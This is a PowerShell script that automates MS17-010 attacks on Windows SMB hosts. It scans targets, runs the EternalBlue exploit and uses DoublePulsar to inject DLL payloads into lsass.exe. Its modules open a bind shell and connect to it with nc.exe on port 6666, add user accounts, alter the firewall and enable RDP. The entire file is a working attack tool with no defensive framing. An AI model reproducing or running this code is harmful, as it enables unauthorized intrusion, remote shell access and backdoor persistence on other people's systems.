$Path = Split-Path -Parent $MyInvocation.MyCommand.Definition
$DLLPAth = "$Path\DLLS"
function CheckMS
{
    [CmdletBinding()]
    Param(
        [string]$target,
        [int]$OS="",
        [int]$Port=445,
        [bool]$fs=$false
    )
    Set-Location $Path/Files
    echo "[*]Check target $target"    
    if ($fs)
    {
        if ($target.indexof("-") -eq -1)
        {
            echo "[X] The IP format is incorrect"
        }else
        {
            $targets = $target.split("-")
            .\MS17-010-Nessus.exe -q -m -b $targets[0] -e $targets[1]
        }
        
    }else{
        if ($OS -eq "")
        {
             .\Smbtouch-1.1.1.exe --TargetIp $target --OutConfig 1.txt
        }else
        {
            echo "[*]Attack target $target"
            $OSstring = ""
            if($OS -eq 1)
            {
                echo "[*] Attack target $target WIN72K8R2"
                $OSstring = "WIN72K8R2"
            }else
            {
                echo "[*] Attack target $target XP"
                $OSstring = "XP"
            }
            .\Eternalblue-2.2.0.exe --TargetIp $target --Target $OSstring --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort $Port --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig 1.txt
        }
    }
    Set-Location $Path
}
function AttackMS
{
    [CmdletBinding()]
    Param(
        [string]$target,
        [string]$x,
        [int]$Port=445,
        [string]$process="lsass.exe",
        [bool]$fs=$false,
        [string]$m="Rshell",
        [string]$DLL,
        [bool]$Reshell=$false
    )
    $DLLPath="$Path\DLLS"
    if ($m -eq "Rshell")
    {
        ServerReshell $process $target $x $Port
    }elseif($m -eq "firewall")
    {
        MoudleMs17 $process $target $x "fire" $Port
        if ($Reshell)
        {
            ServerReshell $process $DLLPath $target $x 
        }
        
    }elseif($m -eq "useradd")
    {
        MoudleMs17 $process $target $x "useradd" $Port
    }
    elseif($m -eq "openrdp")
    {
        MoudleMs17 $process $target $x "openrdp" $Port
    }
}
function MoudleMs17($process,$target,$x,$DLLName,$Port)
{
    Set-Location $Path\Files
    if ($x -eq "x86")
    { 
        .\Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp $target --TargetPort $Port --DllPayload $DLLPath\$DLLName"32.dll" --DllOrdinal 1 ProcessName $process --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll
    }else
    {
        .\Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp $target --TargetPort $Port --DllPayload $DLLPath\$DLLName"64.dll" --DllOrdinal 1 ProcessName $process --ProcessCommandLine --Protocol SMB --Architecture x64 --Function Rundll
    }
    Set-Location $Path

}
function ServerReshell($process,$target,$x,$Port){
    Set-Location $Path\Files
    if ($x -eq "x86")
    {
        .\Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp $target --TargetPort $Port --DllPayload $DLLPath\bindshell32.dll --DllOrdinal 1 ProcessName $process --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll && start-process -FilePath "nc.exe" -ArgumentList "$target 6666" &
    }else
    {
        .\Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp $target --TargetPort $Port --DllPayload $DLLPath\bindshell64_add.dll --DllOrdinal 1 ProcessName $process --ProcessCommandLine --Protocol SMB --Architecture x64 --Function Rundll
        .\Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp $target --TargetPort 445 --DllPayload $DLLPath\bindshell32.dll --DllOrdinal 1 ProcessName $process --ProcessCommandLine --Protocol SMB --Architecture x64 --Function Rundll && start-process -FilePath "nc.exe" -ArgumentList "$target 6666" &
    }
    Set-Location $Path
}